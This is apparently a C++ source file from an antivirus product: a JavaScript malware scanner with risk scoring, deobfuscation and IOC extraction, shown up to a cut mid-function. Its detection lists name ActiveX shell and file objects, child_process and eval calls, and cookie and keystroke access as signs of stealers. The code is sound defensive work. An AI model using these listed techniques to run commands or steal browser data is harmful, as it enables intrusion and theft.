/*
 * ShadowStrike - Enterprise NGAV/EDR Platform
 * Copyright (C) 2026 ShadowStrike Security
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Affero General Public License as published
 * by the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU Affero General Public License for more details.
 *
 * You should have received a copy of the GNU Affero General Public License
 * along with this program. If not, see <https://www.gnu.org/licenses/>.
 */
/**
 * ============================================================================
 * ShadowStrike NGAV - JAVASCRIPT SCANNER IMPLEMENTATION
 * ============================================================================
 *
 * @file JavaScriptScanner.cpp
 * @brief Enterprise-grade JavaScript/JScript malware detection engine.
 *
 * Implements comprehensive detection of JavaScript-based threats including:
 * - Windows Script Host (WSH) malware
 * - ActiveX/COM object abuse
 * - Obfuscation techniques (eval chains, encoding, packers)
 * - Downloaders and droppers
 * - Node.js supply chain attacks
 * - Browser-based threats (cryptojacking, exploit kits)
 *
 * @author ShadowStrike Security Team
 * @version 3.0.0
 * @date 2026
 * @copyright (c) 2026 ShadowStrike Security. All rights reserved.
 *
 * LICENSE: Proprietary - ShadowStrike Enterprise License
 * ============================================================================
 */

#include "pch.h"
#include "JavaScriptScanner.hpp"

#include "../Utils/FileUtils.hpp"
#include "../Utils/Base64Utils.hpp"

#include <regex>
#include <cmath>
#include <sstream>
#include <iomanip>
#include <algorithm>
#include <cctype>

namespace ShadowStrike {
namespace Scripts {

// ============================================================================
// LOGGING CATEGORY
// ============================================================================

static constexpr const wchar_t* LOG_CATEGORY = L"JavaScriptScanner";

// ============================================================================
// INTERNAL CONSTANTS
// ============================================================================

namespace {

    /// Maximum lines to flag in result
    constexpr size_t MAX_FLAGGED_LINES = 50;

    /// Maximum IOCs to extract
    constexpr size_t MAX_EXTRACTED_IOCS = 100;

    /// Minimum script length for analysis
    constexpr size_t MIN_SCRIPT_LENGTH = 10;

    /// Risk score thresholds
    constexpr int RISK_THRESHOLD_SUSPICIOUS = 30;
    constexpr int RISK_THRESHOLD_MALICIOUS = 70;

    /// Suspicious ActiveX objects (lowercase for comparison)
    const std::vector<std::string> SUSPICIOUS_ACTIVEX_OBJECTS = {
        "wscript.shell",
        "scripting.filesystemobject",
        "shell.application",
        "adodb.stream",
        "msxml2.xmlhttp",
        "winhttp.winhttprequest",
        "scripting.dictionary",
        "schedule.service",
        "wmi",
        "winmgmts",
        "msxml2.domdocument",
        "wbemscripting.swbemlocator"
    };

    /// Dangerous method patterns
    const std::vector<std::pair<std::string, int>> DANGEROUS_METHODS = {
        {"run", 15},
        {"exec", 20},
        {"shellexecute", 25},
        {"createobject", 15},
        {"getobject", 10},
        {"write", 5},
        {"saveas", 10},
        {"savetofile", 15},
        {"createtextfile", 10},
        {"deletefile", 15},
        {"copyfile", 10},
        {"movefile", 10},
        {"regread", 15},
        {"regwrite", 20},
        {"regdelete", 20},
        {"send", 10},
        {"open", 5},
        {"responsetext", 5},
        {"responsebody", 5},
        {"eval", 25},
        {"execute", 20},
        {"spawn", 20},
        {"fork", 15},
        {"child_process", 25}
    };

    /// Obfuscation indicators
    const std::vector<std::pair<std::string, JSObfuscationType>> OBFUSCATION_PATTERNS = {
        {"eval(", JSObfuscationType::EvalChain},
        {"eval (", JSObfuscationType::EvalChain},
        {"fromcharcode", JSObfuscationType::CharCodeEncoding},
        {"string.fromcharcode", JSObfuscationType::CharCodeEncoding},
        {"\\u00", JSObfuscationType::UnicodeEscape},
        {"\\x", JSObfuscationType::HexEncoding},
        {"atob(", JSObfuscationType::Base64},
        {"atob (", JSObfuscationType::Base64},
        {"[][(![]+[])", JSObfuscationType::JSFuck},
        {"(+[![]]+[])", JSObfuscationType::JSFuck},
        {"゚ω゚", JSObfuscationType::AAEncode},
        {"$=~[]", JSObfuscationType::JJEncode},
        {"eval(function(p,a,c,k,e", JSObfuscationType::PackerCompression}
    };

    /// Network activity patterns
    const std::vector<std::string> NETWORK_PATTERNS = {
        "xmlhttprequest",
        "msxml2.xmlhttp",
        "winhttp.winhttprequest",
        "fetch(",
        "fetch (",
        "axios",
        "$.ajax",
        "$.get",
        "$.post",
        "http.request",
        "https.request",
        "net.connect",
        "socket"
    };

    /// Malware family signatures
    struct FamilySignature {
        std::string pattern;
        std::string familyName;
        JSThreatCategory category;
        int riskBoost;
    };

    const std::vector<FamilySignature> FAMILY_SIGNATURES = {
        {"nemucod", "Nemucod", JSThreatCategory::Downloader, 40},
        {"locky", "Locky", JSThreatCategory::Ransomware, 50},
        {"cerber", "Cerber", JSThreatCategory::Ransomware, 50},
        {"raa ransomware", "RAA", JSThreatCategory::Ransomware, 50},
        {"cryptojs", "CryptoMiner", JSThreatCategory::CryptoMiner, 30},
        {"coinhive", "CoinHive", JSThreatCategory::CryptoMiner, 40},
        {"cryptonight", "CryptoMiner", JSThreatCategory::CryptoMiner, 35},
        {"miner.start", "CryptoMiner", JSThreatCategory::CryptoMiner, 40},
        {"keylogger", "Keylogger", JSThreatCategory::Keylogger, 45},
        {"onkeydown", "FormGrabber", JSThreatCategory::FormGrabber, 20},
        {"onkeypress", "FormGrabber", JSThreatCategory::FormGrabber, 20},
        {"document.cookie", "InfoStealer", JSThreatCategory::InfoStealer, 15},
        {"localstorage", "InfoStealer", JSThreatCategory::InfoStealer, 10}
    };

    /// URL/IP regex patterns for IOC extraction
    const std::regex URL_REGEX(
        R"((https?:\/\/[^\s\"'<>\)\]]+))",
        std::regex::icase | std::regex::optimize
    );

    const std::regex IP_REGEX(
        R"(\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b)",
        std::regex::optimize
    );

    const std::regex DOMAIN_REGEX(
        R"(\b([a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}\b)",
        std::regex::optimize
    );

}  // anonymous namespace

// ============================================================================
// PIMPL IMPLEMENTATION CLASS
// ============================================================================

class JavaScriptScannerImpl {
public:
    JavaScriptScannerImpl();
    ~JavaScriptScannerImpl();

    // Lifecycle
    [[nodiscard]] bool Initialize(const JSScanConfig& config);
    void Shutdown();
    [[nodiscard]] bool IsInitialized() const noexcept;
    [[nodiscard]] ModuleStatus GetStatus() const noexcept;
    [[nodiscard]] bool UpdateConfig(const JSScanConfig& config);
    [[nodiscard]] JSScanConfig GetConfig() const;

    // Scanning
    [[nodiscard]] JSScanResult ScanContent(
        std::string_view content,
        std::string_view sourceName,
        uint32_t processId);

    [[nodiscard]] JSScanResult ScanFile(
        const std::filesystem::path& path,
        uint32_t processId);

    // Analysis
    [[nodiscard]] JSEngineType DetectEngineType(std::string_view content);
    [[nodiscard]] JSObfuscationDetails AnalyzeObfuscation(std::string_view content);
    [[nodiscard]] std::string Deobfuscate(std::string_view content, size_t maxDepth);
    [[nodiscard]] std::vector<std::string> ExtractIOCs(std::string_view content);
    [[nodiscard]] std::vector<ActiveXUsage> DetectActiveXUsage(std::string_view content);
    [[nodiscard]] std::vector<JSNetworkActivity> DetectNetworkActivity(std::string_view content);

    // Callbacks
    void RegisterCallback(ScanResultCallback callback);
    void RegisterErrorCallback(ErrorCallback callback);
    void UnregisterCallbacks();

    // Statistics
    [[nodiscard]] JSStatistics GetStatistics() const;
    void ResetStatistics();
    [[nodiscard]] bool SelfTest();

private:
    // Configuration
    mutable std::shared_mutex m_configMutex;
    JSScanConfig m_config;

    // State
    std::atomic<ModuleStatus> m_status{ModuleStatus::Uninitialized};
    std::atomic<bool> m_initialized{false};

    // Callbacks
    mutable std::shared_mutex m_callbackMutex;
    std::vector<ScanResultCallback> m_callbacks;
    std::vector<ErrorCallback> m_errorCallbacks;

    // Statistics
    mutable JSStatistics m_stats;

    // Internal methods
    [[nodiscard]] double CalculateEntropy(std::string_view content) const;
    [[nodiscard]] int CalculateRiskScore(
        const std::vector<ActiveXUsage>& activeX,
        const std::vector<JSNetworkActivity>& network,
        const JSObfuscationDetails& obfuscation,
        std::string_view content) const;

    [[nodiscard]] std::string ComputeContentHash(std::string_view content) const;
    [[nodiscard]] std::vector<std::pair<size_t, std::string>> FindFlaggedLines(
        std::string_view content) const;

    [[nodiscard]] std::pair<JSThreatCategory, std::string> DetectMalwareFamily(
        std::string_view content,
        int& riskBoost) const;

    void NotifyCallbacks(const JSScanResult& result);
    void NotifyError(const std::string& message, int code);

    [[nodiscard]] std::string ToLower(std::string_view str) const;
    [[nodiscard]] bool ContainsIgnoreCase(std::string_view haystack, std::string_view needle) const;

    [[nodiscard]] std::string DecodeBase64Segments(std::string_view content) const;
    [[nodiscard]] std::string DecodeCharCodeSequences(std::string_view content) const;
    [[nodiscard]] std::string DecodeHexEscapes(std::string_view content) const;
    [[nodiscard]] std::string DecodeUnicodeEscapes(std::string_view content) const;
};

// ============================================================================
// JAVASCRIPTSCANNER IMPLEMENTATION (SINGLETON WRAPPER)
// ============================================================================

std::atomic<bool> JavaScriptScanner::s_instanceCreated{false};

JavaScriptScanner& JavaScriptScanner::Instance() noexcept {
    static JavaScriptScanner instance;
    return instance;
}

bool JavaScriptScanner::HasInstance() noexcept {
    return s_instanceCreated.load(std::memory_order_acquire);
}

JavaScriptScanner::JavaScriptScanner()
    : m_impl(std::make_unique<JavaScriptScannerImpl>()) {
    s_instanceCreated.store(true, std::memory_order_release);
    SS_LOG_INFO(LOG_CATEGORY, L"JavaScriptScanner instance created");
}

JavaScriptScanner::~JavaScriptScanner() {
    if (m_impl) {
        m_impl->Shutdown();
    }
    s_instanceCreated.store(false, std::memory_order_release);
    SS_LOG_INFO(LOG_CATEGORY, L"JavaScriptScanner instance destroyed");
}

bool JavaScriptScanner::Initialize(const JSScanConfig& config) {
    return m_impl->Initialize(config);
}

void JavaScriptScanner::Shutdown() {
    m_impl->Shutdown();
}

bool JavaScriptScanner::IsInitialized() const noexcept {
    return m_impl->IsInitialized();
}

ModuleStatus JavaScriptScanner::GetStatus() const noexcept {
    return m_impl->GetStatus();
}

bool JavaScriptScanner::UpdateConfig(const JSScanConfig& config) {
    return m_impl->UpdateConfig(config);
}

JSScanConfig JavaScriptScanner::GetConfig() const {
    return m_impl->GetConfig();
}

JSScanResult JavaScriptScanner::ScanFile(const std::filesystem::path& path) {
    return m_impl->ScanFile(path, 0);
}

JSScanResult JavaScriptScanner::ScanFile(
    const std::filesystem::path& path,
    uint32_t processId) {
    return m_impl->ScanFile(path, processId);
}

JSScanResult JavaScriptScanner::ScanMemory(
    std::span<const char> content,
    std::string_view sourceName) {
    return m_impl->ScanContent(
        std::string_view(content.data(), content.size()),
        sourceName,
        0);
}

JSScanResult JavaScriptScanner::ScanMemory(
    std::span<const char> content,
    std::string_view sourceName,
    uint32_t processId) {
    return m_impl->ScanContent(
        std::string_view(content.data(), content.size()),
        sourceName,
        processId);
}

JSScanResult JavaScriptScanner::ScanString(
    std::string_view content,
    std::string_view sourceName) {
    return m_impl->ScanContent(content, sourceName, 0);
}

JSEngineType JavaScriptScanner::DetectEngineType(std::string_view content) {
    return m_impl->DetectEngineType(content);
}

JSObfuscationDetails JavaScriptScanner::AnalyzeObfuscation(std::string_view content) {
    return m_impl->AnalyzeObfuscation(content);
}

std::string JavaScriptScanner::Deobfuscate(std::string_view content, size_t maxDepth) {
    return m_impl->Deobfuscate(content, maxDepth);
}

std::vector<std::string> JavaScriptScanner::ExtractIOCs(std::string_view content) {
    return m_impl->ExtractIOCs(content);
}

std::vector<ActiveXUsage> JavaScriptScanner::DetectActiveXUsage(std::string_view content) {
    return m_impl->DetectActiveXUsage(content);
}

std::vector<JSNetworkActivity> JavaScriptScanner::DetectNetworkActivity(
    std::string_view content) {
    return m_impl->DetectNetworkActivity(content);
}

void JavaScriptScanner::RegisterCallback(ScanResultCallback callback) {
    m_impl->RegisterCallback(std::move(callback));
}

void JavaScriptScanner::RegisterErrorCallback(ErrorCallback callback) {
    m_impl->RegisterErrorCallback(std::move(callback));
}

void JavaScriptScanner::UnregisterCallbacks() {
    m_impl->UnregisterCallbacks();
}

JSStatistics JavaScriptScanner::GetStatistics() const {
    return m_impl->GetStatistics();
}

void JavaScriptScanner::ResetStatistics() {
    m_impl->ResetStatistics();
}

bool JavaScriptScanner::SelfTest() {
    return m_impl->SelfTest();
}

std::string JavaScriptScanner::GetVersionString() noexcept {
    std::ostringstream oss;
    oss << JSConstants::VERSION_MAJOR << "."
        << JSConstants::VERSION_MINOR << "."
        << JSConstants::VERSION_PATCH;
    return oss.str();
}

// ============================================================================
// JAVASCRIPTSCANNERIMPL - LIFECYCLE
// ============================================================================

JavaScriptScannerImpl::JavaScriptScannerImpl() {
    m_stats.startTime = Clock::now();
}

JavaScriptScannerImpl::~JavaScriptScannerImpl() {
    Shutdown();
}

bool JavaScriptScannerImpl::Initialize(const JSScanConfig& config) {
    if (m_initialized.load(std::memory_order_acquire)) {
        SS_LOG_WARN(LOG_CATEGORY, L"JavaScriptScanner already initialized");
        return true;
    }

    m_status.store(ModuleStatus::Initializing, std::memory_order_release);

    try {
        // Validate configuration
        if (!config.IsValid()) {
            SS_LOG_ERROR(LOG_CATEGORY, L"Invalid configuration provided");
            m_status.store(ModuleStatus::Error, std::memory_order_release);
            return false;
        }

        {
            std::unique_lock lock(m_configMutex);
            m_config = config;
        }

        // Reset statistics
        ResetStatistics();

        m_initialized.store(true, std::memory_order_release);
        m_status.store(ModuleStatus::Running, std::memory_order_release);

        SS_LOG_INFO(LOG_CATEGORY, L"JavaScriptScanner initialized successfully");
        return true;

    } catch (const std::exception& e) {
        SS_LOG_ERROR(LOG_CATEGORY, L"Initialization failed: %hs", e.what());
        m_status.store(ModuleStatus::Error, std::memory_order_release);
        return false;
    } catch (...) {
        SS_LOG_FATAL(LOG_CATEGORY, L"Unexpected error during initialization");
        m_status.store(ModuleStatus::Error, std::memory_order_release);
        return false;
    }
}

void JavaScriptScannerImpl::Shutdown() {
    if (!m_initialized.load(std::memory_order_acquire)) {
        return;
    }

    m_status.store(ModuleStatus::Stopping, std::memory_order_release);

    // Clear callbacks
    UnregisterCallbacks();

    m_initialized.store(false, std::memory_order_release);
    m_status.store(ModuleStatus::Stopped, std::memory_order_release);

    SS_LOG_INFO(LOG_CATEGORY, L"JavaScriptScanner shut down");
}

bool JavaScriptScannerImpl::IsInitialized() const noexcept {
    return m_initialized.load(std::memory_order_acquire);
}

ModuleStatus JavaScriptScannerImpl::GetStatus() const noexcept {
    return m_status.load(std::memory_order_acquire);
}

bool JavaScriptScannerImpl::UpdateConfig(const JSScanConfig& config) {
    if (!config.IsValid()) {
        SS_LOG_ERROR(LOG_CATEGORY, L"Invalid configuration update rejected");
        return false;
    }

    std::unique_lock lock(m_configMutex);
    m_config = config;

    SS_LOG_INFO(LOG_CATEGORY, L"Configuration updated");
    return true;
}

JSScanConfig JavaScriptScannerImpl::GetConfig() const {
    std::shared_lock lock(m_configMutex);
    return m_config;
}

// ============================================================================
// JAVASCRIPTSCANNERIMPL - SCANNING
// ============================================================================

JSScanResult JavaScriptScannerImpl::ScanFile(
    const std::filesystem::path& path,
    uint32_t processId) {

    JSScanResult result;
    result.scanTime = std::chrono::system_clock::now();
    result.filePath = path;
    result.processId = processId;

    const auto startTime = Clock::now();

    try {
        // Validate file exists
        std::error_code ec;
        if (!std::filesystem::exists(path, ec)) {
            result.status = JSScanStatus::ErrorFileAccess;
            result.description = "File not found";
            SS_LOG_WARN(LOG_CATEGORY, L"File not found: %ls", path.wstring().c_str());
            return result;
        }

        // Check file size
        const auto fileSize = std::filesystem::file_size(path, ec);
        if (ec) {
            result.status = JSScanStatus::ErrorFileAccess;
            result.description = "Cannot get file size";
            return result;
        }

        JSScanConfig config;
        {
            std::shared_lock lock(m_configMutex);
            config = m_config;
        }

        if (fileSize > config.maxScriptSize) {
            result.status = JSScanStatus::SkippedSizeLimit;
            result.description = "File exceeds size limit";
            SS_LOG_DEBUG(LOG_CATEGORY, L"File exceeds size limit: %llu bytes", fileSize);
            return result;
        }

        // Read file content
        std::string content;
        Utils::FileUtils::Error fileError;
        if (!Utils::FileUtils::ReadAllTextUtf8(path.wstring(), content, &fileError)) {
            result.status = JSScanStatus::ErrorFileAccess;
            result.description = "Cannot read file: " + fileError.message;
            SS_LOG_ERROR(LOG_CATEGORY, L"Cannot read file: %ls (error %u)",
                         path.wstring().c_str(), fileError.win32);
            return result;
        }

        // Perform scan
        result = ScanContent(content, path.filename().string(), processId);
        result.filePath = path;

    } catch (const std::exception& e) {
        result.status = JSScanStatus::ErrorInternal;
        result.description = std::string("Internal error: ") + e.what();
        SS_LOG_ERROR(LOG_CATEGORY, L"Exception scanning file: %hs", e.what());
        NotifyError(e.what(), -1);
    }

    result.scanDuration = std::chrono::duration_cast<std::chrono::microseconds>(
        Clock::now() - startTime);

    return result;
}

JSScanResult JavaScriptScannerImpl::ScanContent(
    std::string_view content,
    std::string_view sourceName,
    uint32_t processId) {

    JSScanResult result;
    result.scanTime = std::chrono::system_clock::now();
    result.processId = processId;

    const auto startTime = Clock::now();

    // Update statistics
    m_stats.totalScans.fetch_add(1, std::memory_order_relaxed);
    m_stats.totalBytesScanned.fetch_add(content.size(), std::memory_order_relaxed);

    try {
        JSScanConfig config;
        {
            std::shared_lock lock(m_configMutex);
            config = m_config;
        }

        // Check if scanning is enabled
        if (!config.enabled) {
            result.status = JSScanStatus::Clean;
            result.description = "Scanning disabled";
            return result;
        }

        // Validate content size
        if (content.size() < MIN_SCRIPT_LENGTH) {
            result.status = JSScanStatus::Clean;
            result.description = "Content too small for analysis";
            return result;
        }

        if (content.size() > config.maxScriptSize) {
            result.status = JSScanStatus::SkippedSizeLimit;
            result.description = "Content exceeds size limit";
            return result;
        }

        // Compute content hash
        result.sha256 = ComputeContentHash(content);

        // Detect engine type
        result.targetEngine = DetectEngineType(content);
        m_stats.byEngine[static_cast<size_t>(result.targetEngine)].fetch_add(
            1, std::memory_order_relaxed);

        // Analyze obfuscation
        if (config.enableDeobfuscation) {
            result.obfuscation = AnalyzeObfuscation(content);
            if (result.obfuscation.primaryType != JSObfuscationType::None) {
                m_stats.obfuscatedDetected.fetch_add(1, std::memory_order_relaxed);
            }
        }

        // Detect ActiveX usage
        result.activeXUsage = DetectActiveXUsage(content);
        if (!result.activeXUsage.empty()) {
            size_t suspiciousCount = 0;
            for (const auto& ax : result.activeXUsage) {
                if (ax.isSuspicious) {
                    suspiciousCount++;
                }
            }
            if (suspiciousCount > 0) {
                m_stats.activeXAbuse.fetch_add(suspiciousCount, std::memory_order_relaxed);
            }
        }

        // Detect network activity
        result.networkActivity = DetectNetworkActivity(content);

        // Extract IOCs
        result.extractedIOCs = ExtractIOCs(content);

        // Find flagged lines
        result.flaggedLines = FindFlaggedLines(content);

        // Detect malware family
        int familyRiskBoost = 0;
        auto [category, familyName] = DetectMalwareFamily(content, familyRiskBoost);
        if (category != JSThreatCategory::None) {
            result.category = category;
            result.detectedFamily = familyName;
        }

        // Calculate risk score
        result.riskScore = CalculateRiskScore(
            result.activeXUsage,
            result.networkActivity,
            result.obfuscation,
            content);
        result.riskScore += familyRiskBoost;

        // Cap risk score at 100
        if (result.riskScore > 100) {
            result.riskScore = 100;
        }

        // Determine final status
        if (result.riskScore >= RISK_THRESHOLD_MALICIOUS) {
            result.status = JSScanStatus::Malicious;
            result.isMalicious = true;
            m_stats.maliciousDetected.fetch_add(1, std::memory_order_relaxed);

            // Generate threat name
            if (!result.detectedFamily.empty()) {
                result.threatName = "JS/" + result.detectedFamily;
            } else if (!result.activeXUsage.empty()) {
                result.threatName = "JS/Trojan.ActiveX";
            } else {
                result.threatName = "JS/Suspicious.Generic";
            }

        } else if (result.riskScore >= RISK_THRESHOLD_SUSPICIOUS) {
            result.status = JSScanStatus::Suspicious;
            m_stats.suspiciousDetected.fetch_add(1, std::memory_order_relaxed);
            result.threatName = "JS/Suspicious.Obfuscated";

        } else {
            result.status = JSScanStatus::Clean;
        }

        // Check for downloader characteristics
        if (!result.networkActivity.empty() && !result.activeXUsage.empty()) {
            for (const auto& ax : result.activeXUsage) {
                if (ax.isSuspicious) {
                    for (const auto& net : result.networkActivity) {
                        if (!net.target.empty()) {
                            result.category = JSThreatCategory::Downloader;
                            m_stats.downloadersDetected.fetch_add(1, std::memory_order_relaxed);
                            break;
                        }
                    }
                    break;
                }
            }
        }

        // Update category statistics
        m_stats.byCategory[static_cast<size_t>(result.category)].fetch_add(
            1, std::memory_order_relaxed);

        // Generate description
        if (result.isMalicious) {
            std::ostringstream desc;
            desc << "Malicious JavaScript detected";
            if (!result.detectedFamily.empty()) {
                desc << " (Family: " << result.detectedFamily << ")";
            }
            desc << ". Risk score: " << result.riskScore;
            desc << ". ActiveX abuse: " << result.activeXUsage.size();
            desc << ". Network indicators: " << result.networkActivity.size();
            result.description = desc.str();
        } else if (result.status == JSScanStatus::Suspicious) {
            result.description = "Suspicious patterns detected. Manual review recommended.";
        }

        // Notify callbacks
        NotifyCallbacks(result);

    } catch (const std::exception& e) {
        result.status = JSScanStatus::ErrorInternal;
        result.description = std::string("Internal error: ") + e.what();
        SS_LOG_ERROR(LOG_CATEGORY, L"Exception scanning content: %hs", e.what());
        NotifyError(e.what(), -1);
    }

    result.scanDuration = std::chrono::duration_cast<std::chrono::microseconds>(
        Clock::now() - startTime);

    return result;
}

// ============================================================================
// JAVASCRIPTSCANNERIMPL - ANALYSIS
// ============================================================================

JSEngineType JavaScriptScannerImpl::DetectEngineType(std::string_view content) {
    const std::string lower = ToLower(content.substr(0, std::min(content.size(), size_t(10000))));

    // Check for Node.js patterns
    if (ContainsIgnoreCase(lower, "require(") ||
        ContainsIgnoreCase(lower, "module.exports") ||
        ContainsIgnoreCase(lower, "process.env") ||
        ContainsIgnoreCase(lower, "__dirname") ||
        ContainsIgnoreCase(lower, "child_process")) {
        return JSEngineType::NodeJS;
    }

    // Check for WSH/JScript patterns
    if (ContainsIgnoreCase(lower, "wscript") ||
        ContainsIgnoreCase(lower, "activexobject") ||
        ContainsIgnoreCase(lower, "new activexobject") ||
        ContainsIgnoreCase(lower, "scripting.filesystemobject") ||
        ContainsIgnoreCase(lower, "shell.application")) {
        return JSEngineType::JScriptWSH;
    }

    // Check for Electron patterns
    if (ContainsIgnoreCase(lower, "electron") ||
        ContainsIgnoreCase(lower, "remote.require") ||
        ContainsIgnoreCase(lower, "ipcrenderer")) {
        return JSEngineType::Electron;
    }

    // Check for PDF JavaScript
    if (ContainsIgnoreCase(lower, "this.getfield") ||
        ContainsIgnoreCase(lower, "app.alert") ||
        ContainsIgnoreCase(lower, "util.printf")) {
        return JSEngineType::PDF;
    }

    // Check for browser patterns
    if (ContainsIgnoreCase(lower, "document.") ||
        ContainsIgnoreCase(lower, "window.") ||
        ContainsIgnoreCase(lower, "navigator.") ||
        ContainsIgnoreCase(lower, "localstorage") ||
        ContainsIgnoreCase(lower, "document.cookie")) {
        // Determine specific browser engine (best effort)
        return JSEngineType::BrowserV8;  // Default to V8 as most common
    }

    return JSEngineType::Unknown;
}

JSObfuscationDetails JavaScriptScannerImpl::AnalyzeObfuscation(std::string_view content) {
    JSObfuscationDetails details;

    const std::string lower = ToLower(content);
    const double entropy = CalculateEntropy(content);
    details.entropyScore = entropy;

    // Check for obfuscation patterns
    for (const auto& [pattern, type] : OBFUSCATION_PATTERNS) {
        if (lower.find(pattern) != std::string::npos) {
            details.detectedTechniques.push_back(type);
        }
    }

    // Count eval occurrences
    size_t evalCount = 0;
    size_t pos = 0;
    while ((pos = lower.find("eval", pos)) != std::string::npos) {
        evalCount++;
        pos += 4;
    }

    // Count string splitting (concatenation operators)
    size_t concatCount = 0;
    pos = 0;
    while ((pos = lower.find("]+[", pos)) != std::string::npos) {
        concatCount++;
        pos += 3;
    }

    // Check for suspicious variable naming patterns
    size_t shortVarCount = 0;
    std::regex shortVarPattern(R"(\b[a-z_$][a-z0-9_$]?\s*=)", std::regex::icase);
    std::string contentStr(content);
    auto begin = std::sregex_iterator(contentStr.begin(), contentStr.end(), shortVarPattern);
    auto end = std::sregex_iterator();
    shortVarCount = std::distance(begin, end);

    // Calculate obfuscation confidence
    details.confidence = 0.0;

    if (entropy > JSConstants::ENTROPY_THRESHOLD_OBFUSCATED) {
        details.confidence += 30.0;
    } else if (entropy > 4.5) {
        details.confidence += 15.0;
    }

    if (evalCount > 3) {
        details.confidence += 20.0;
        details.detectedTechniques.push_back(JSObfuscationType::EvalChain);
    }

    if (concatCount > 10) {
        details.confidence += 15.0;
        details.detectedTechniques.push_back(JSObfuscationType::StringSplitting);
    }

    if (shortVarCount > 20 && content.size() > 500) {
        details.confidence += 10.0;
        details.detectedTechniques.push_back(JSObfuscationType::VariableRenaming);
    }

    // Cap confidence at 100
    if (details.confidence > 100.0) {
        details.confidence = 100.0;
    }

    details.suspiciousTokenCount = evalCount + concatCount;

    // Determine primary obfuscation type
    if (!details.detectedTechniques.empty()) {
        details.primaryType = details.detectedTechniques[0];
    }

    return details;
}

std::string JavaScriptScannerImpl::Deobfuscate(std::string_view content, size_t maxDepth) {
    std::string result(content);

    for (size_t depth = 0; depth < maxDepth; ++depth) {
        std::string previous = result;

        // Decode Base64 segments
        result = DecodeBase64Segments(result);

        // Decode String.fromCharCode sequences
        result = DecodeCharCodeSequences(result);

        // Decode hex escapes
        result = DecodeHexEscapes(result);

        // Decode unicode escapes
        result = DecodeUnicodeEscapes(result);

        // If no changes were made, stop iterating
        if (result == previous) {
            break;
        }
    }

    return result;
}

std::vector<std::string> JavaScriptScannerImpl::ExtractIOCs(std::string_view content) {
    std::vector<std::string> iocs;
    std::string contentStr(content);

    try {
        // Extract URLs
        std::sregex_iterator urlBegin(contentStr.begin(), contentStr.end(), URL_REGEX);
        std::sregex_iterator urlEnd;
        for (auto it = urlBegin; it != urlEnd && iocs.size() < MAX_EXTRACTED_IOCS; ++it) {
            iocs.push_back(it->str());
        }

        // Extract IP addresses
        std::sregex_iterator ipBegin(contentStr.begin(), contentStr.end(), IP_REGEX);
        std::sregex_iterator ipEnd;
        for (auto it = ipBegin; it != ipEnd && iocs.size() < MAX_EXTRACTED_IOCS; ++it) {
            std::string ip = it->str();
            // Filter out common false positives (version numbers)
            if (ip.find("0.0.0") != 0 && ip.find("127.0.0") != 0) {
                iocs.push_back(ip);
            }
        }

    } catch (const std::regex_error& e) {
        SS_LOG_ERROR(LOG_CATEGORY, L"Regex error extracting IOCs: %hs", e.what());
    }

    // Remove duplicates
    std::sort(iocs.begin(), iocs.end());
    iocs.erase(std::unique(iocs.begin(), iocs.end()), iocs.end());

    return iocs;
}

std::vector<ActiveXUsage> JavaScriptScannerImpl::DetectActiveXUsage(std::string_view content) {
    std::vector<ActiveXUsage> usages;
    const std::string lower = ToLower(content);

    // Find ActiveXObject or CreateObject patterns
    std::regex activeXPattern(
        R"((new\s+activexobject|createobject|getobject)\s*\(\s*[\"']([^\"']+)[\"'])",
        std::regex::icase | std::regex::optimize
    );

    std::string contentStr(content);
    auto begin = std::sregex_iterator(contentStr.begin(), contentStr.end(), activeXPattern);
    auto end = std::sregex_iterator();

    size_t lineNumber = 1;
    for (auto it = begin; it != end; ++it) {
        ActiveXUsage usage;
        usage.objectName = (*it)[2].str();

        // Calculate approximate line number
        size_t pos = it->position();
        lineNumber = 1 + std::count(contentStr.begin(), contentStr.begin() + pos, '\n');
        usage.lineNumber = lineNumber;

        // Check if suspicious
        std::string lowerObj = ToLower(usage.objectName);
        for (const auto& suspicious : SUSPICIOUS_ACTIVEX_OBJECTS) {
            if (lowerObj.find(suspicious) != std::string::npos) {
                usage.isSuspicious = true;
                usage.suspicionReason = "Known dangerous ActiveX object: " + usage.objectName;
                break;
            }
        }

        usages.push_back(std::move(usage));
    }

    return usages;
}

std::vector<JSNetworkActivity> JavaScriptScannerImpl::DetectNetworkActivity(
    std::string_view content) {

    std::vector<JSNetworkActivity> activities;
    const std::string lower = ToLower(content);

    for (const auto& pattern : NETWORK_PATTERNS) {
        if (lower.find(pattern) != std::string::npos) {
            JSNetworkActivity activity;
            activity.apiUsed = pattern;

            // Try to extract target URL
            auto iocs = ExtractIOCs(content);
            if (!iocs.empty()) {
                activity.target = iocs[0];
            }

            // Check for HTTP methods
            if (lower.find("\"get\"") != std::string::npos ||
                lower.find("'get'") != std::string::npos) {
                activity.method = "GET";
            } else if (lower.find("\"post\"") != std::string::npos ||
                       lower.find("'post'") != std::string::npos) {
                activity.method = "POST";
            }

            activities.push_back(std::move(activity));
        }
    }

    return activities;
}

// ============================================================================
// JAVASCRIPTSCANNERIMPL - CALLBACKS
// ============================================================================

void JavaScriptScannerImpl::RegisterCallback(ScanResultCallback callback) {
    if (!callback) return;

    std::unique_lock lock(m_callbackMutex);
    m_callbacks.push_back(std::move(callback));
}

void JavaScriptScannerImpl::RegisterErrorCallback(ErrorCallback callback) {
    if (!callback) return;

    std::unique_lock lock(m_callbackMutex);
    m_errorCallbacks.push_back(std::move(callback));
}

void JavaScriptScannerImpl::UnregisterCallbacks() {
    std::unique_lock lock(m_callbackMutex);
    m_callbacks.clear();
    m_errorCallbacks.clear();
}

void JavaScriptScannerImpl::NotifyCallbacks(const JSScanResult& result) {
    std::shared_lock lock(m_callbackMutex);
    for (const auto& callback : m_callbacks) {
        try {
            callback(result);
        } catch (const std::exception& e) {
            SS_LOG_ERROR(LOG_CATEGORY, L"Callback exception: %hs", e.what());
        }
    }
}

void JavaScriptScannerImpl::NotifyError(const std::string& message, int code) {
    std::shared_lock lock(m_callbackMutex);
    for (const auto& callback : m_errorCallbacks) {
        try {
            callback(message, code);
        } catch (...) {
            // Ignore callback exceptions
        }
